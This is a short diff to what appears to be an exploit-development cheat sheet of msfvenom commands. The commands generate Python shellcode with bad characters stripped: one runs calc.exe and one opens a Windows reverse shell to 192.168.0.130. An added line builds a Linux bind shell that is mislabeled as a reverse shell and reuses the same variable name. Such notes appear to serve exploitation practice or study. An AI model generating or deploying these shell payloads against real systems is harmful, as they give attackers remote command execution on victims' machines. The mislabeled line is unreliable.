@@ -43,3 +43,6 @@ sprintf = "\x00\x0A\x0D"
 msfvenom -p windows/exec -b '\x00\x0A' -f python --var-name shellcode_calc CMD=calc.exe EXITFUNC=thread
 # Rev shell (catch with nc)
 msfvenom -p windows/shell_reverse_tcp -b '\x00\x0A' -f python LHOST=192.168.0.130 LPORT=51251  EXITFUNC=thread --var-name shellcode_rev_nc
+
+# Rev linux shell (catch with nc)
+msfvenom -p linux/x86/shell_bind_tcp -b '\x00\x0A\x0D\x20' -f python LHOST=192.168.0.130 LPORT=51251  EXITFUNC=thread --var-name shellcode_rev_nc
